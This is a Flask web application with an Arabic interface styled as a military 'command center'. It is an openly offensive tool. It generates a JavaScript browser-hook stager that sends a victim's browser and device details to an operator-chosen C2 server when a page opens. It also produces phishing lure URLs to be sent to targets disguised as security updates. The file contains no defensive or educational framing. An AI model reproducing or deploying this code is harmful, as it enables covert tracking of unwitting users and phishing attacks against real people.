from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

import asyncio
import random
import urllib3
import httpx
import base64
urllib3.disable_warnings()

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - منظومة السيطرة عبر الروابط v17.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:32px}
.panel{background:#04060e;border:2px solid #ff0040;padding:25px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
input, select{padding:16px;width:70%;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:16px;outline:none;text-align:left;direction:ltr;margin-bottom:10px}
input:focus, select:focus{box-shadow:0 0 30px #ff0040}
button{padding:16px 35px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:16px;margin-top:10px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 40px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Medium{border-right-color:#ffaa00;background:#140c01}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - السيطرة عبر الروابط v17.0 ⚔️</h1>
<div class="panel">
<input id="target_url" placeholder="C2_SERVER_OR_PHISHING_DOMAIN" value="http://">
<br>
<select id="command_type">
  <option value="generate_browser_hook">توليد خطاف متصفح الهدف (Browser Hook JS)</option>
  <option value="generate_phishing_lure">توليد رابط الاستدراج والتمويه (Phishing Lure URL)</option>
  <option value="audit_link_listeners">فحص واستطلاع حالة الروابط والخطافات النشطة</option>
</select>
<br>
<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر توليد الروابط العسكرية 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
async function executeLinkModule(){
 const url = document.getElementById('target_url').value.trim();
 const cmdType = document.getElementById('command_type').value;
 if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري توليد الروابط والخطافات... ⚡';
 status.textContent='⏳ جارٍ معالجة الأوامر الاستراتيجية لـ: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url: url, command: cmdType})
   });
   const data = await res.json();
   status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
   
   if(!data.actions || data.actions.length==0){
     results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b><div class="proof">No link stager vectors returned.</div></div>';
   } else {
     data.actions.forEach(v=>{
       results.innerHTML+=`
       <div class="card ${v.severity || 'Low'}">
         <b>⚡ ${v.type}</b>
         <div style="margin:8px 0">${v.desc}</div>
         <div class="proof">${v.proof}</div>
       </div>`;
     });
   }
 }catch(e){
   status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
 }
 btn.disabled=false; btn.textContent='تنفيذ أمر توليد الروابط العسكرية 🚀';
}
</script>
</body>
</html>"""

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

async def execute_v17_link_engine(target, command_mode):
    actions = []
    waf_status = f"Browser Hook & Link Engine ({command_mode})"
    
    if command_mode == "generate_browser_hook":
        browser_hook_js = """<script>
// V400 Browser Hook Stager
(function(){
    var c2 = "%s";
    var info = {
        ua: navigator.userAgent,
        lang: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        screen: window.screen.width + "x" + window.screen.height
    };
    fetch(c2 + '/hook_collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(info)
    }).catch(function(){});
})();
</script>""" % target

        actions.append({
            "type": "BROWSER HOOK JAVASCRIPT GENERATED",
            "severity": "Critical",
            "desc": "تم توليد شفرة خطاف المتصفح لجمع معلومات الأجهزة وبيانات الجلسات فور فتح الرابط.",
            "proof": browser_hook_js
        })
    elif command_mode == "generate_phishing_lure":
        lure_template = f"""{target}/auth/verify/login?token=secure_session_9941
# قالب رابط التمويه الميداني المخصص لإرساله للهدف تحت غطاء تحديث أمني أو خدمة طارئة."""

        actions.append({
            "type": "PHISHING LURE URL GENERATED",
            "severity": "Critical",
            "desc": "تم إعداد رابط التمويه الاستراتيجي الجاهز للتوجيه نحو الهدف.",
            "proof": lure_template
        })
    else:
        actions.append({
            "type": "LINK LISTENERS AUDIT",
            "severity": "Low",
            "desc": "تم فحص حالة الروابط والخطافات النشطة بنجاح.",
            "proof": f"Target Domain: {target}"
        })

    return actions, waf_status

@app.route('/', methods=['GET'])
def home():
    return HTML_COMMAND_CENTER

@app.route('/api/index', methods=['POST'])
def check():
    req_data = request.get_json(silent=True) or {}
    target = clean_url(req_data.get("url", "http://"))
    command_mode = req_data.get("command", "generate_browser_hook")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    actions, waf_status = loop.run_until_complete(execute_v17_link_engine(target, command_mode))
    loop.close()

    return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
